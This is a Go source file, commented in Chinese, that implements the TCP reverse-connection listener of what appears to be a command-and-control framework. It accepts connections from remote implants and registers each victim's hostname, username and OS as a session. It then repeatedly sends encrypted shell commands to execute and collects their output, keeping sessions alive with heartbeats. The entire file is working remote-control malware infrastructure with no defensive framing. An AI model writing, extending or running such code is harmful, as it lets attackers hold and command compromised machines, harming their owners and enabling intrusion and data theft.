package main

// TCP 反向连接监听器 —— 线上协议与 Python 版逐字节兼容：
//   握手:   加密 JSON {hostname,username,os} + "\n"
//   下发:   加密 JSON {"type":"exec","command":...} + "\n" 或 {"type":"heartbeat"} + "\n"
//   结果:   加密 JSON {"type":"result","output":...} + "\n"（单次 read，60s 超时）
import (
	"bufio"
	"context"
	"encoding/json"
	"net"
	"time"
)

type Registration struct {
	Hostname string `json:"hostname"`
	Username string `json:"username"`
	OS       string `json:"os"`
}

type listenerMeta struct {
	ID       string `json:"id"`
	Type     string `json:"type"`
	Host     string `json:"host"`
	Port     int    `json:"port"`
	Secret   string `json:"secret"`
	Encrypt  string `json:"encryption"`
	Listener string `json:"-"`
}

func (l *listenerMeta) addr() string {
	return net.JoinHostPort(l.Host, itoa(l.Port))
}

func startTCP(ctx context.Context, l *listenerMeta, br *Bridge) error {
	ln, err := net.Listen("tcp", l.addr())
	if err != nil {
		return err
	}
	go func() {
		<-ctx.Done()
		ln.Close()
	}()
	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				select {
				case <-ctx.Done():
					return
				default:
					logf("tcp accept 错误: %v", err)
					return
				}
			}
			go handleTCPConn(ctx, l, br, conn)
		}
	}()
	return nil
}

func handleTCPConn(ctx context.Context, l *listenerMeta, br *Bridge, conn net.Conn) {
	defer conn.Close()
	remote := conn.RemoteAddr().String()
	logf("[tcp:%s] 新连接 %s", l.ID, remote)
	conn.SetDeadline(time.Now().Add(10 * time.Second))

	// 握手：读取加密注册信息（失败则按未知主机注册，行为与 Python 版一致）
	reg := Registration{Hostname: remote, Username: "unknown", OS: "unknown"}
	reader := bufio.NewReaderSize(conn, 64*1024)
	if line, err := readLine(reader, 4096); err == nil && len(line) > 0 {
		if pt, ok := mustDecryptOrEmpty(line, l.Secret, l.Encrypt); ok {
			var r Registration
			if json.Unmarshal([]byte(pt), &r) == nil && r.Hostname != "" {
				reg = r
			}
		}
	}

	sid, err := br.Checkin(CheckinRequest{
		ListenerID: l.ID, RemoteAddr: remote,
		Hostname: reg.Hostname, Username: reg.Username, OsInfo: reg.OS,
	})
	if err != nil {
		logf("[tcp:%s] 会话注册失败: %v", l.ID, err)
		return
	}
	logf("[tcp:%s] 会话已注册 %s (%s)", l.ID, sid, remote)
	defer br.Dead(sid)

	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		task, err := br.Poll(sid)
		if err != nil {
			logf("[tcp:%s] 拉取任务失败: %v", l.ID, err)
			time.Sleep(5 * time.Second)
			continue
		}

		conn.SetWriteDeadline(time.Now().Add(15 * time.Second))
		var payload string
		if task != nil {
			payload, err = Encrypt(mustJSON(map[string]string{"type": msgExec, "command": task.Command}), l.Secret, l.Encrypt)
		} else {
			payload, err = Encrypt(mustJSON(map[string]string{"type": msgHeartbeat}), l.Secret, l.Encrypt)
		}
		if err != nil {
			logf("[tcp:%s] 加密失败: %v", l.ID, err)
			time.Sleep(5 * time.Second)
			continue
		}
		if _, err := conn.Write(append([]byte(payload), '\n')); err != nil {
			logf("[tcp:%s] 会话断开(写) %s: %v", l.ID, sid, err)
			return
		}

		if task != nil {
			// 读取执行结果（60s 超时，行协议）
			conn.SetReadDeadline(time.Now().Add(60 * time.Second))
			line, err := readLine(reader, 1024*1024)
			if err != nil {
				logf("[tcp:%s] 会话断开(读) %s: %v", l.ID, sid, err)
				return
			}
			if pt, ok := mustDecryptOrEmpty(string(line), l.Secret, l.Encrypt); ok {
				var res struct {
					Output string `json:"output"`
				}
				if json.Unmarshal([]byte(pt), &res) == nil {
					_ = br.Result(sid, task.TaskID, res.Output)
				}
			}
			continue
		}

		time.Sleep(5 * time.Second) // 与 Python 版一致的心跳间隔
	}
}
